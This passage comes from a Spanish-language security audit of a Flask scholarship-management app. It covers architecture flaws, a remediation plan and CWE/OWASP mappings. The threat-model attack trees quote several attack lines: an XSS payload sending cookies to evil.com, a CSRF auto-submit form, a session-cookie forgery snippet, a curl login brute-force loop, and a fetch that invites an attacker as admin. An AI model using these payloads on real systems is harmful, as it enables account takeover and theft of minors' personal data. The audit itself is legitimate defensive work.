### BUG-08 · `init_db()` en el startup sin migraciones

**Severidad:** Medio (operaciones)
**Ubicación:** `app.py:43-44`

**Código:**

```python
with app.app_context():
    init_db()
```

**Descripción:**

`init_db()` (presumiblemente `metadata.create_all()`) crea las tablas si no existen, pero **no las migra** si el schema cambia. En producción:

- Agregar una columna → la app falla al hacer `SELECT nueva_col FROM ...`.
- Quitar una columna → la app falla al hacer `INSERT INTO ... (vieja_col)`.
- Cambiar tipo de una columna → errores en runtime.

**Remediación:**

Usar **Alembic** para migraciones versionadas:

```bash
pip install alembic
alembic init migrations
# Configurar alembic.ini y migrations/env.py para usar los modelos
alembic revision --autogenerate -m "initial schema"
alembic upgrade head
```

```python
# app.py — NO llamar init_db() en producción
def create_app() -> Flask:
    app = Flask(...)
    ...
    if app.env == "development":
        with app.app_context():
            init_db()  # solo en dev
    # En producción, correr migraciones vía CLI antes de iniciar la app
```


---

## 8. Errores de Arquitectura DDD

Esta sección cubre desviaciones respecto a los patrones canónicos de Domain-Driven Design (Evans 2003, Vernon 2013). Aunque no son vulnerabilidades directas, **afectan la capacidad de razonar sobre la seguridad** del sistema y facilitan la introducción de bugs.

### DDD-01 · Filtración de entidad de dominio a la capa web

**Severidad:** Crítico (arquitectura)
**Ubicación:** `auth_utils.py:29`, todos los controllers
**Estado:** Confirmado (ver CRIT-06 para detalle completo)

La capa web accede directamente a `g.usuario_actual.rol`, `g.usuario_actual.id_usuario`, y pasa la entidad completa como `actor_admin` a los use cases. Debería usarse un DTO inmutable (`AuthenticatedUserDTO`) que exponga solo los campos mínimos.

---

### DDD-02 · Service Locator pattern con `g.usuario_actual`

**Severidad:** Alto (arquitectura)
**Ubicación:** Todos los controllers que usan `g.usuario_actual`

**Descripción:**

`flask.g` es un **Service Locator** — un registry global donde cualquier código puede obtener dependencias. Los use cases reciben `actor_admin=g.usuario_actual` como parámetro, lo que aparenta ser dependency injection, pero el origen (`g.usuario_actual`) es un lookup global.

**Problemas:**

1. **Dependencias ocultas**: Un use case que recibe `actor_admin` parece depender solo de ese parámetro, pero en realidad depende del estado global de Flask.
2. **Testing difícil**: Para testear un use case, hay que mockear `flask.g` en vez de simplemente pasar un mock como parámetro.
3. **Acoplamiento temporal**: El use case solo funciona si se ejecuta dentro de un request context de Flask. No se puede usar fuera (e.g., en un worker asíncrono, un CLI, un test unitario puro).
4. **Side effects**: Si algo muta `g.usuario_actual` durante el request (e.g., un middleware), el use case ve la versión mutada.

**Remediación:**

Patrón Application Service con DI explícita:

```python
# src/application/application_service.py
from dataclasses import dataclass

@dataclass(frozen=True)
class AuthContext:
    """Contexto de autenticación explícito, no global."""
    user_id: int
    rol: str
    email: str

class ApplicationService:
    """Base class con DI explícita de dependencias."""
    def __init__(self, auth_context: AuthContext, uow: UnitOfWork):
        self.auth_context = auth_context
        self.uow = uow

# src/web/middleware.py — construye el contexto y lo pasa
@app.before_request
def _build_auth_context():
    g.auth_context = AuthContext(
        user_id=session.get("user_id"),
        rol=session.get("rol"),  # o mejor, cargar de DB
        email=session.get("email"),
    )

# src/web/routes/admin.py
@admin_bp.route("/padrinos/nuevo", methods=["POST"])
@requiere_rol("administrador")
def nuevo_padrino():
    with UnitOfWork(SessionLocal()) as uow:
        service = GestionarPadrinosService(g.auth_context, uow)
        service.crear(datos={...})
```

---

### DDD-03 · DTOs ausentes en responses de use cases

**Severidad:** Alto (arquitectura)
**Ubicación:** Todos los templates que reciben `datos`, `actores`, `resultado_uc`

**Descripción:**

Los controllers pasan directamente al template los resultados de los use cases:

```python
# admin.py:104-111
return render_template(
    "admin/actores_lista.html",
    actores=actores,  # ← ¿qué es esto? ¿entidad? ¿dict? ¿DTO?
    total_actores=total,
    pagina_actual=pagina,
    busqueda=busqueda or "",
    filtro_rol=filtro_rol
)

# tutor.py:78
return render_template("shared/becario_detalle.html", datos=datos, id_usuario=id_usuario)
```

Si `actores` es una lista de entidades de dominio (e.g., `list[Usuario]`), el template Jinja2 puede acceder a **cualquier propiedad** de la entidad: `{{ actor.password_hash }}`, `{{ actor.refresh_tokens }}`, `{{ actor.notas_internas }}`. Esto es:

1. **Filtración de datos sensibles** si el template accidentalmente itera atributos.
2. **Acoplamiento web ↔ dominio**: cambiar la entidad rompe el template.
3. **Difícil auditing**: no se sabe qué campos se exponen a la vista sin leer el template.

**Remediación:**

Definir DTOs de salida explícitos:

```python
# src/application/dto.py
from dataclasses import dataclass

@dataclass(frozen=True)
class ActorListDTO:
    id: int
    nombre: str
    apellido: str
    email: str
    rol: str
    telefono: str | None
    # NO incluir: password_hash, refresh_tokens, estado_interno, fecha_baja, notas

@dataclass(frozen=True)
class BecarioDetalleDTO:
    id: int
    nombre: str
    apellido: str
    datos_academicos: "DatosAcademicosDTO"
    vinculaciones: list["VinculacionDTO"]
    # NO incluir: datos financieros, notas internas del tutor, etc.

# Use cases devuelven DTOs:
class ListarActoresUseCase:
    def execute(self, ...) -> list[ActorListDTO]:
        entidades = self.repo.listar(...)
        return [ActorListDTO.from_entity(e) for e in entidades]
```

---

### DDD-04 · Validación de dominio omitida en controllers

**Severidad:** Alto (arquitectura)
**Ubicación:** Todos los controllers

**Descripción:**

Los controllers construyen dicts con `request.form.get(...)` y los pasan directamente a use cases sin validación:

```python
# admin.py:155-162
datos = {
    "nombre": request.form.get("nombre", "").strip(),
    "apellido": request.form.get("apellido", "").strip(),
    "email": request.form.get("email", "").strip(),
    "telefono": request.form.get("telefono", "").strip(),
    "direccion": request.form.get("direccion", "").strip()
}
uc.crear(actor_admin=g.usuario_actual, datos=datos)
```

Si el use case no valida (y no podemos verificarlo), se persisten datos inválidos. Aún si el use case valida, los errores llegan como `ValueError` genérico sin información de campo, dificultando mostrar errores por campo en el form.

**Remediación:**

Implementar un **Anti-Corruption Layer** con Request objects tipados y validados:

```python
# src/application/requests.py
from dataclasses import dataclass
from email_validator import validate_email, EmailNotValidError

@dataclass(frozen=True)
class CrearPadrinoRequest:
    nombre: str
    apellido: str
    email: str
    telefono: str | None
    direccion: str | None
    
    @classmethod
    def from_form(cls, form) -> "CrearPadrinoRequest":
        # Validación en el constructor
        nombre = form.get("nombre", "").strip()
        if not nombre or len(nombre) > 100:
            raise ValidationError("nombre", "Nombre es requerido y debe tener hasta 100 caracteres.")
        
        apellido = form.get("apellido", "").strip()
        if not apellido or len(apellido) > 100:
            raise ValidationError("apellido", "Apellido es requerido.")
        
        email_raw = form.get("email", "").strip()
        try:
            email = validate_email(email_raw, check_deliverability=False).normalized
        except EmailNotValidError:
            raise ValidationError("email", "Email inválido.")
        
        telefono = form.get("telefono", "").strip() or None
        if telefono and not telefono.replace("+", "").replace(" ", "").replace("-", "").isdigit():
            raise ValidationError("telefono", "Teléfono inválido.")
        
        return cls(nombre=nombre, apellido=apellido, email=email, telefono=telefono, direccion=...)
    
    @classmethod
    def from_dict(cls, datos: dict) -> "CrearPadrinoRequest":
        # Para uso desde tests u otros use cases
        ...

# Uso en controller:
@admin_bp.route("/padrinos/nuevo", methods=["POST"])
@requiere_rol("administrador")
def nuevo_padrino():
    try:
        req = CrearPadrinoRequest.from_form(request.form)
    except ValidationError as e:
        flash(f"Error en campo {e.field}: {e.message}", "error")
        return redirect(url_for("admin.nuevo_padrino"))
    
    uc = get_padrinos_use_case()
    uc.crear(actor_admin=g.usuario_actual, request=req)
    ...
```

---

### DDD-05 · Repositorios instanciados en cada request

**Severidad:** Medio (arquitectura)
**Ubicación:** Todos los controllers

**Descripción:**

Cada controller instancia repositorios en cada request:

```python
# admin.py:29-31
def get_padrinos_use_case():
    repo = SQLAlchemyPadrinoRepository(g.db_session)
    return GestionarPadrinosUseCase(repo)

# auth.py:43-44
auth_service = SupabaseAuthService(get_supabase_client())
repo = SQLAlchemyUsuarioRepository(g.db_session)
use_case = LoginUseCase(auth_service, repo)
```

Esto **no es incorrecto** (DI manual por request), pero:

1. **Repetición**: El mismo wiring se duplica en cada controller.
2. **Inconsistencia**: Algunos controllers usan helpers (`get_padrinos_use_case()`), otros instancian inline.
3. **Difícil testing**: Para testear un controller, hay que mockear múltiples capas.
4. **Sin IoC container**: No hay un contenedor que resuelva dependencias, lo que dificultaría swap de implementaciones (e.g., mock repo para tests).

**Remediación:**

Usar un **Composition Root** con un DI container ligero:

```python
# src/infrastructure/container.py
from dependency_injector import containers, providers, inject

class Container(containers.DeclarativeContainer):
    db_session = providers.Factory(SessionLocal)
    
    usuario_repo = providers.Factory(SQLAlchemyUsuarioRepository, session=db_session)
    padrino_repo = providers.Factory(SQLAlchemyPadrinoRepository, session=db_session)
    becario_repo = providers.Factory(SQLAlchemyBecarioRepository, session=db_session)
    
    supabase_client = providers.Singleton(get_supabase_client)
    auth_service = providers.Factory(SupabaseAuthService, client=supabase_client)
    
    listar_actores_uc = providers.Factory(ListarActoresUseCase, repo=usuario_repo)
    gestionar_padrinos_uc = providers.Factory(GestionarPadrinosUseCase, repo=padrino_repo)
    # ...

# app.py
from src.infrastructure.container import Container

def create_app() -> Flask:
    app = Flask(...)
    container = Container()
    container.wire(modules=["src.web.routes.admin", "src.web.routes.auth", ...])
    app.container = container
    ...

# admin.py
from dependency_injector.wiring import inject, Provide

@admin_bp.route("/padrinos/nuevo", methods=["POST"])
@requiere_rol("administrador")
@inject
def nuevo_padrino(
    uc: GestionarPadrinosUseCase = Provide[Container.gestionar_padrinos_uc],
):
    ...
```

---

### DDD-06 · Acoplamiento web ↔ infraestructura

**Severidad:** Medio (arquitectura)
**Ubicación:** `auth.py:9, 11`, `admin.py:9-23`, `tutor.py:12`, `becario.py:24-25`

**Descripción:**

Los controllers importan directamente de `src.infrastructure`:

```python
# auth.py
from src.infrastructure.database import get_supabase_client
from src.infrastructure.repositories import SQLAlchemyUsuarioRepository
from src.infrastructure.auth_service import SupabaseAuthService

# admin.py
from src.infrastructure.repositories import (
    SQLAlchemyUsuarioRepository, SQLAlchemyPadrinoRepository, SQLAlchemyBecarioRepository
)
from src.infrastructure.database import get_supabase_client
from src.infrastructure.auth_service import SupabaseAuthService
from src.infrastructure.storage.supabase_storage import SupabaseStorageServiceImpl
```

**Problemas:**

1. **La capa web conoce detalles de infraestructura** (SQLAlchemy, Supabase). Si mañana se cambia a Postgres directo o Firebase, hay que reescribir los controllers.
2. **Viola la regla de dependencias DDD**: las dependencias deben ir hacia adentro (web → application → domain), nunca saltarse capas.
3. **Difícil testing**: Para testear un controller, hay que mockear clases concretas de infraestructura, no interfaces.

**Remediación:**

Definir **interfaces** en la capa de aplicación y **implementaciones** en infraestructura:

```python
# src/application/ports.py (interfaces)
from abc import ABC, abstractmethod

class UsuarioRepository(ABC):
    @abstractmethod
    def obtener_por_id(self, user_id: int) -> UsuarioDTO | None: ...
    
    @abstractmethod
    def obtener_por_email(self, email: str) -> UsuarioDTO | None: ...

class AuthService(ABC):
    @abstractmethod
    def login(self, email: str, password: str) -> AuthResult: ...
    
    @abstractmethod
    def logout(self, token: str) -> None: ...

class StorageService(ABC):
    @abstractmethod
    def upload(self, path: str, content: bytes, content_type: str) -> str: ...
    
    @abstractmethod
    def delete(self, path: str) -> None: ...

# src/infrastructure/repositories.py (implementaciones)
class SQLAlchemyUsuarioRepository(UsuarioRepository):
    def __init__(self, session: Session):
        self.session = session
    # implementación concreta

# src/web/routes/auth.py — solo conoce las interfaces
from src.application.ports import UsuarioRepository, AuthService
# (resueltas vía DI container, ver DDD-05)
```

---

### DDD-07 · Use case `LoginUseCase` recibe dependencias no inyectadas limpiamente

**Severidad:** Bajo (arquitectura)
**Ubicación:** `auth.py:43-45`

**Código:**

```python
auth_service = SupabaseAuthService(get_supabase_client())
repo = SQLAlchemyUsuarioRepository(g.db_session)
use_case = LoginUseCase(auth_service, repo)
```

**Descripción:**

El controller **conoce** qué implementación concreta de `AuthService` y `UsuarioRepository` usar. Esto significa:

- Para testear el controller con un auth service mock, hay que monkey-patchear `SupabaseAuthService` o `get_supabase_client`.
- No hay forma de swapear implementaciones sin cambiar el código del controller.

**Remediación:**

Ver DDD-05 y DDD-06 — usar DI container que resuelva interfaces.


---

## 9. Threat Modeling y Attack Trees

### 9.1 Attack Surface Map

```
                                    ┌─────────────────────────────┐
                                    │   INTERNET (atacante)       │
                                    └─────────────┬───────────────┘
                                                  │
                                    ┌─────────────▼───────────────┐
                                    │   Reverse Proxy / CDN       │
                                    │   (¿TLS? ¿HSTS? ¿WAF?)      │
                                    └─────────────┬───────────────┘
                                                  │
                            ┌─────────────────────┴──────────────────────┐
                            │                                              │
                  ┌─────────▼─────────┐                       ┌──────────▼──────────┐
                  │  /auth/*          │                       │  /admin/*           │
                  │  (público + auth) │                       │  (requiere admin)   │
                  └─────────┬─────────┘                       └──────────┬──────────┘
                            │                                            │
       ┌────────────────────┼────────────────────┐          ┌────────────┼─────────────┐
       │                    │                    │          │            │             │
┌──────▼─────┐    ┌─────────▼────────┐    ┌──────▼──────┐  ┌─▼────────┐ ┌▼──────────┐ ┌▼──────────┐
│ /login     │    │ /recuperar-      │    │ /set-       │  │/padrinos │ │/becarios/ │ │/invitar   │
│ (POST, no  │    │ contrasena       │    │ password    │  │/nuevo    │ │<id>/elimi │ │(POST, no  │
│  CSRF, no  │    │ (POST, no CSRF,  │    │ (POST, no   │  │(POST, no │ │nar (POST, │ │ CSRF, no  │
│  rate      │    │  no rate limit,  │    │  CSRF, token│  │ CSRF, no │ │ no CSRF,  │ │ whitelist │
│  limit)    │    │  email enum)     │    │  en form)   │  │ validac.)│ │ SAGA)     │ │ rol)      │
└────────────┘    └──────────────────┘    └─────────────┘  └──────────┘ └───────────┘ └───────────┘

                  ┌─────────────────────┐                                ┌──────────────────────┐
                  │  /tutor/*           │                                │  /becario/*          │
                  │  (requiere tutor)   │                                │  (requiere becario)  │
                  └─────────┬───────────┘                                └──────────┬───────────┘
                            │                                                       │
              ┌─────────────┼─────────────┐                              ┌──────────┼──────────┐
              │             │             │                              │          │           │
       ┌──────▼─────┐ ┌─────▼──────┐ ┌────▼─────────┐             ┌──────▼───┐ ┌────▼─────┐ ┌──▼──────────┐
       │/mis-becarios│ │/becario/   │ │/becario/<id>/│             │/academico│ │/academico│ │/academico/  │
       │(GET, IDOR   │ │<id>        │ │ auditoria    │             │/editar   │ │/documento│ │ (GET)       │
       │potencial)   │ │(GET, IDOR) │ │(POST, no CSRF│             │(POST, no │ │/eliminar │ │             │
       │             │ │            │ │, no whitel.) │             │ CSRF, no │ │(POST, no │ │             │
       │             │ │            │ │              │             │ validac.)│ │ CSRF)    │ │             │
       └────────────┘ └────────────┘ └──────────────┘             └──────────┘ └──────────┘ └─────────────┘
```

**Endpoints de mayor riesgo:**
1. `/admin/becarios/<id>/eliminar` — DELETE sin CSRF, SAGA multi-step.
2. `/admin/invitar` — POST sin CSRF, sin whitelist de rol → potencial escalada a admin.
3. `/auth/login` — POST sin rate limit → brute force.
4. `/auth/set-password` — POST con token en form → token leak.
5. `/tutor/becario/<id>` — GET con IDOR potencial.

### 9.2 Attack Tree #1: Compromiso total vía SECRET_KEY expuesto en el repo

```
Objetivo: Compromiso total del sistema (acceso admin sin credenciales)
│
├── [OR] Obtener SECRET_KEY
│   ├── [Y] Tener acceso de lectura al repo (insider, ex-employee, leak)
│   │   └── grep "SECRET_KEY" src/web/app.py  →  "dev-secret-key-fonbec-1234"
│   └── [OR] Brute-forcear SECRET_KEY (si no fuera hardcodeado)
│       └── [Y] Obtener una cookie de sesión válida de un usuario legítimo
│           └── [Y] Ejecutar flask-unsign --wordlist contra la cookie
│
├── [Y] Forjar cookie de sesión con rol=admin
│   └── from flask.sessions import SecureCookieSessionInterface
│       forged = s.dumps({"user_id": 1, "rol": "administrador", "access_token": "x"})
│
├── [Y] Acceder a /admin/dashboard con cookie forjada
│   └── CRIT-03 + CRIT-04: no se re-valida rol ni JWT
│
└── [Y] Ejecutar cualquier acción de admin
    ├── Eliminar becarios: POST /admin/becarios/<id>/eliminar
    ├── Invitar atacante como admin: POST /admin/invitar (email=atacante, rol=administrador)
    ├── Vincular becarios a actores controlados: POST /admin/becarios/<id>/vinculaciones/vincular
    └── Acceder a datos de todos los becarios: GET /admin/becarios/<id>/detalle

Costo del ataque: BAJO (acceso de lectura al repo + 30 líneas de Python)
Probabilidad: ALTA (si el repo es público o tiene muchos colaboradores)
Impacto: CRÍTICO (acceso total, exfiltración de datos de menores becarios)
```

### 9.3 Attack Tree #2: CSRF + fuga de email → eliminación de becario

```
Objetivo: Eliminar un becario específico (e.g., sabotaje)
│
├── [Y] Conocer el ID del becario objetivo
│   └── [OR] Ingeniería social (convencer al admin de mostrar la lista)
│       └── [OR] Si el ID es secuencial, probar /admin/becarios/1, /2, /3...
│
├── [Y] Conocer el email del admin (para email_confirmacion)
│   └── [OR] Email público de la organización (admin@fonbec.org)
│   └── [OR] LinkedIn / sitio web de Fonbec
│
├── [Y] Crear página maliciosa que auto-envíe el form
│   └── <form action="https://fonbec.example.com/admin/becarios/42/eliminar" method="POST">
│         <input name="email_confirmacion" value="admin@fonbec.org">
│       </form>
│       <script>document.forms[0].submit()</script>
│
├── [Y] Inducir al admin a visitar la página maliciosa
│   └── [OR] Phishing: email con link a "novedad urgente"
│   └── [OR] Ad placement en sitios que el admin visita
│
└── [Y] Browser del admin envía cookie de sesión automáticamente
    └── CRIT-02: no hay CSRF token → request procesado
    └── Becario #42 eliminado (DB + Storage + Auth)

Mitigante parcial: el admin debe estar logueado (sesión activa) en el momento del click
Costo del ataque: MEDIO (reconnaissance + ingeniería social)
Probabilidad: MEDIA
Impacto: ALTO (pérdida de datos del becario, posible incumplimiento legal)
```

### 9.4 Attack Tree #3: Stored XSS en perfil → robo de sesión admin

```
Objetivo: Comprometer la cuenta de un administrador
│
├── [Y] Crear cuenta de becario (o comprometer una existente)
│   └── [OR] Phishing a un becario real para obtener sus credenciales
│
├── [Y] Setear teléfono con payload XSS
│   └── POST /auth/perfil
│       telefono = <script>fetch('https://evil.com/?c='+document.cookie)</script>
│   └── CRIT-06 + MED-10: sin sanitización en web layer
│
├── [Y] Esperar que un admin vea el perfil del becario
│   └── [OR] Reportar un "problema con mi perfil" via email al admin
│   └── Admin visita /admin/becarios/<id>/detalle
│
├── [Y] El script ejecuta en el contexto del admin
│   └── Si el template usa |safe o autoescape=false → HIGH-09 confirmado
│   └── Si CSP ausente (HIGH-04) → fetch a evil.com permitido
│
└── [Y] Cookie robada... pero es HTTPOnly (mitigación parcial)
    └── [OR] En vez de robar cookie, hacer fetch a /admin/invitar
        └── fetch('/admin/invitar', {method:POST, credentials:'include',
                body:new URLSearchParams({email:'atacante@evil.com', rol:'administrador'})})
        └── Atacante recibe invitación de admin → acceso legit de admin

Costo del ataque: MEDIO
Probabilidad: MEDIA-ALTA (depende de los templates, no auditados)
Impacto: CRÍTICO (escalada a admin)
```

### 9.5 Attack Tree #4: Brute force + account lockout DoS

```
Objetivo: DoS selectivo a un usuario específico
│
├── [Y] Conocer el email de la víctima
│   └── [OR] Email público
│   └── [OR] Enumeración vía /auth/recuperar-contrasena (MED-04)
│
├── [Y] Enviar requests repetidos a /auth/login con passwords aleatorios
│   └── CRIT-02 + HIGH-03: no hay rate limit, no hay CSRF en login
│   └── for i in $(seq 1 10000); do curl -X POST /auth/login -d "email=victim@...&password=$RANDOM"; done
│
└── [Y] Tras N intentos fallidos (si se implementa account lockout)
    ├── Cuenta bloqueada → víctima no puede acceder (DoS exitoso)
    └── Si NO se implementa lockout (caso actual) → eventual brute force success si la password es débil

Costo del ataque: BAJO
Probabilidad: ALTA
Impacto: MEDIO (DoS) a ALTO (si brute force exitoso)
```

### 9.6 Attack Tree #5: Token theft vía Implicit Flow fallback

```
Objetivo: Robar el access_token de Supabase de un usuario
│
├── [Y] Víctima inicia flujo de invitación o recuperación de contraseña
│   └── Visita /auth/callback o /auth/nueva-contrasena
│
├── [Y] Supabase redirige con #access_token=... en URL fragment
│   └── Si PKCE falla (raro) o si el flujo es Implicit (MED-05)
│
├── [Y] Víctima navega a otro sitio desde esa página
│   └── Referer header incluye la URL con el fragment
│   └── Si el sitio destino es del atacante → captura del token
│
└── [Y] Atacante usa el token contra la API de Supabase directamente
    └── No contra la app Flask (que requiere cookie), pero contra Supabase Auth API
    └── Puede leer/modificar datos del usuario en Supabase

Mitigantes: browser modernos limpian Referer de fragments (pero no todos)
Costo del ataque: BAJO
Probabilidad: BAJA-MEDIA
Impacto: ALTO (acceso a Supabase, datos del usuario)
```

### 9.7 Kill Chain consolidada (caso peor)

Combinando los 5 attack trees en un escenario worst-case:

```
1. Atacante obtiene SECRET_KEY del repo (CRIT-01)
   ↓
2. Forja cookie de admin (CRIT-03 + CRIT-04 no validan)
   ↓
3. Accede a /admin/becarios/<id>/detalle de TODOS los becarios
   ↓
4. Exfiltra datos personales (nombre, teléfono, dirección, edad, sexo) de menores
   ↓
5. Opcional: roba el SECRET_KEY rotado → repite desde paso 2
   ↓
6. Opcional: usa la cuenta de admin para invitar a otros atacantes (CRIT-02 permite CSRF)
   ↓
7. Persistencia: el atacante-admin puede crear backdoors (invitar a sí mismo como admin legítimo)
   ↓
8. Cubrir huellas: eliminar logs (si hay acceso al servidor) o simplemente no generar logs (BUG-05)

Tiempo total de explotación: < 1 hora desde paso 1
Detección: PRÁCTICAMENTE IMPOSIBLE (no hay auditoría, no hay alertas)
```

---

## 10. Plan de Remediación Prioritario

### P0 — Urgente (resolver antes de cualquier deploy a producción)

| ID | Hallazgo | Esfuerzo | Acción inmediata |
|----|----------|----------|------------------|
| CRIT-01 | SECRET_KEY hardcodeado | 1h | Fallar fuerte si no está en env. Rotar la llave actual. Auditar logs. |
| CRIT-02 | Sin CSRF | 4h | Instalar Flask-WTF, aplicar CSRFProtect global, agregar tokens en todos los forms. |
| CRIT-03 | Rol/user_id de cookie | 8h | Cargar rol desde DB en cada request. No confiar en `session["rol"]`. |
| CRIT-04 | JWT no re-validado | 8h | Validar token contra Supabase con caché LRU 60s. |
| HIGH-01 | Cookie Secure flag | 0.5h | `SESSION_COOKIE_SECURE = True` en prod. |
| HIGH-03 | Rate limiting | 4h | Instalar Flask-Limiter con Redis backend. Aplicar a /auth/*. |
| HIGH-04 | Headers de seguridad | 2h | Instalar flask-talisman con CSP estricta. |
| HIGH-05 | Logout vía GET | 0.5h | Cambiar a POST-only. |
| HIGH-07 | MAX_CONTENT_LENGTH | 0.5h | Setear a 16MB. |

**Esfuerzo total P0: ~29 horas (~4 días dev)**

### P1 — Alta prioridad (resolver en el primer sprint de seguridad)

| ID | Hallazgo | Esfuerzo |
|----|----------|----------|
| HIGH-02 | Session Fixation | 4h |
| HIGH-06 | Upload sin validación | 8h |
| HIGH-08 | IDOR en tutor routes | 4h (verificar use case + agregar defense in depth) |
| HIGH-09 | Stored XSS potencial | 8h (auditar templates + sanitizar inputs) |
| CRIT-05 | Auto-commit en teardown | 8h (refactor a Unit of Work) |
| MED-01 | Tokens en sesión | 16h (migrar a flask-session server-side) |
| MED-03 | Info disclosure en flashes | 4h |
| MED-04 | Email enumeration | 4h |
| MED-06 | Tokens en hidden fields | 4h |
| MED-10 | Mass assignment | 8h |

**Esfuerzo total P1: ~68 horas (~9 días dev)**

### P2 — Media prioridad (segundo sprint de seguridad)

| ID | Hallazgo | Esfuerzo |
|----|----------|----------|
| MED-02 | access_token en POST form | 4h |
| MED-05 | Implicit Flow deprecated | 8h |
| MED-07 | directorio_rol sin whitelist | 2h |
| MED-08 | invitar sin whitelist rol | 4h |
| MED-09 | Logout no revoca token | 4h |
| BUG-01 | Manejo excepciones inconsistente | 8h |
| BUG-02 | Race condition temp tokens | 4h |
| BUG-05 | Logging estructurado ausente | 16h |
| BUG-07 | Carga 1000 actores por request | 4h |
| BUG-08 | init_db sin migraciones | 8h (setup Alembic) |
| DDD-01 a DDD-07 | Refactor arquitectura | 80h (sprint completo) |

**Esfuerzo total P2: ~142 horas (~18 días dev)**

### P3 — Baja prioridad (mantenimiento continuo)

| ID | Hallazgo | Esfuerzo |
|----|----------|----------|
| LOW-01 | DB session para estáticos | 0.5h |
| LOW-02 | int() inseguro en edad | 1h |
| LOW-03 | Case-sensitive email | 2h |
| LOW-04 | Sliding expiration | 2h |
| BUG-03 | Imports circulares | 4h |
| BUG-04 | int() inconsistente | 1h |
| BUG-06 | Validación de pagina | 1h |

**Esfuerzo total P3: ~11.5 horas (~2 días dev)**

### Resumen de esfuerzos

| Prioridad | Esfuerzo total | Tiempo estimado (1 dev) |
|-----------|----------------|-------------------------|
| P0 | 29h | 4 días |
| P1 | 68h | 9 días |
| P2 | 142h | 18 días |
| P3 | 11.5h | 2 días |
| **Total** | **250.5h** | **~33 días dev** |

### Checklist de verificación post-remediación

Una vez aplicados los fixes, verificar:

- [ ] **CRIT-01**: Ejecutar `python -c "import os; print(os.environ.get('SECRET_KEY'))"` en prod → no vacío. Ejecutar la app sin `SECRET_KEY` → RuntimeError.
- [ ] **CRIT-02**: Verificar que todos los forms tienen `<input type="hidden" name="csrf_token">`. Hacer un POST sin CSRF token → 400.
- [ ] **CRIT-03**: Cambiar `rol` en la cookie forjada → request debe fallar (rol cargado de DB).
- [ ] **CRIT-04**: Detener Supabase → request a /admin/dashboard debe redirigir a login.
- [ ] **CRIT-05**: Hacer GET a /admin/dashboard → no debe haber commit en DB logs.
- [ ] **HIGH-01**: Verificar `Set-Cookie: session=...; Secure; HttpOnly; SameSite=Lax`.
- [ ] **HIGH-03**: Hacer 6 logins fallidos seguidos → 429 Too Many Requests.
- [ ] **HIGH-04**: Verificar headers en respuesta: `Content-Security-Policy`, `Strict-Transport-Security`, `X-Frame-Options: DENY`.
- [ ] **HIGH-06**: Subir un `.html` como "Programa" → rechazado.
- [ ] **HIGH-07**: Subir un archivo de 100MB → 413 Request Entity Too Large.
- [ ] **HIGH-09**: Auditar todos los templates con `grep -rn "|safe\|autoescape false" src/templates/` → 0 resultados no justificados.
- [ ] **MED-04**: Enviar recuperación para email inexistente y existente → mismo response, mismo timing (±50ms).

---

## 11. Apéndice: Referencias CWE y OWASP

### CWE IDs referenciados

| CWE ID | Nombre | Hallazgos |
|--------|--------|-----------|
| CWE-20 | Improper Input Validation | MED-07, MED-08, LOW-02 |
| CWE-178 | Improper Handling of Case Sensitivity | LOW-03 |
| CWE-204 | Observable Response Discrepancy | MED-04 |
| CWE-209 | Error Message with Sensitive Info | MED-03 |
| CWE-307 | Improper Restriction of Excessive Auth Attempts | HIGH-03 |
| CWE-319 | Cleartext Transmission of Sensitive Information | HIGH-04 |
| CWE-326 | Inadequate Encryption Strength | MED-05 |
| CWE-352 | Cross-Site Request Forgery (CSRF) | CRIT-02, HIGH-05 |
| CWE-384 | Session Fixation | HIGH-02 |
| CWE-400 | Uncontrolled Resource Consumption | HIGH-07, LOW-01, BUG-07 |
| CWE-434 | Unrestricted Upload of File with Dangerous Type | HIGH-06 |
| CWE-522 | Insufficiently Protected Credentials | MED-01, MED-06 |
| CWE-601 | URL Redirection to Untrusted Site | MED-02 |
| CWE-613 | Insufficient Session Expiration | CRIT-04, LOW-04 |
| CWE-614 | Sensitive Cookie Without Secure Attribute | HIGH-01 |
| CWE-639 | Authorization Bypass Through User-Controlled Key | CRIT-03, HIGH-08 |
| CWE-645 | Overly Restrictive Account Lockout Mechanism | MED-09 |
| CWE-798 | Use of Hard-coded Credentials | CRIT-01 |
| CWE-915 | Improperly Controlled Modification of Object Attributes | MED-10 |
| CWE-1021 | Improper Restriction of Rendered UI Layers or Frames | HIGH-04 |
| — | (no aplica CWE) | CRIT-05, CRIT-06, BUG-01 a BUG-08, DDD-01 a DDD-07 |

### OWASP Top 10 2021 referenciado

| Categoría | Nombre | Hallazgos |
|-----------|--------|-----------|
| **A01:2021** | Broken Access Control | CRIT-02, CRIT-03, HIGH-05, HIGH-08 |
| **A02:2021** | Cryptographic Failures | MED-05 |
| **A03:2021** | Injection (XSS, etc.) | HIGH-09, MED-07, MED-08, LOW-02 |
| **A04:2021** | Insecure Design | HIGH-06, HIGH-07, MED-01, MED-03, MED-06, LOW-01, CRIT-06 |
| **A05:2021** | Security Misconfiguration | HIGH-01, HIGH-04 |
| **A07:2021** | Identification and Authentication Failures | CRIT-01, CRIT-04, HIGH-02, HIGH-03, MED-02, MED-04, MED-09, LOW-03, LOW-04 |
| **A08:2021** | Software and Data Integrity Failures | MED-10 |
| A06:2021 | Vulnerable and Outdated Components | No auditado (falta `requirements.txt`) |
| A09:2021** | Security Logging and Monitoring Failures | BUG-05 |
| A10:2021 | Server-Side Request Forgery (SSRF) | No detectado |

### Referencias externas

- **OWASP Top 10 2021**: https://owasp.org/Top10/
- **OWASP ASVS 4.0** (Application Security Verification Standard): https://owasp.org/www-project-application-security-verification-standard/
- **OWASP CSRF Prevention Cheat Sheet**: https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html
- **OWASP Session Management Cheat Sheet**: https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html
- **OWASP File Upload Cheat Sheet**: https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html
- **OWASP Authentication Cheat Sheet**: https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html
- **CWE List**: https://cwe.mitre.org/
- **Flask Security Documentation**: https://flask.palletsprojects.com/en/latest/security/
- **Flask-WTF CSRF**: https://flask-wtf.readthedocs.io/en/latest/csrf.html
- **Flask-Talisman**: https://github.com/GoogleCloudPlatform/flask-talisman
- **Flask-Limiter**: https://flask-limiter.readthedocs.io/
- **OAuth 2.1 Draft**: https://datatracker.ietf.org/doc/draft-ietf-oauth-v2-1/
- **Supabase Auth PKCE**: https://supabase.com/docs/guides/auth/server-side-rendering
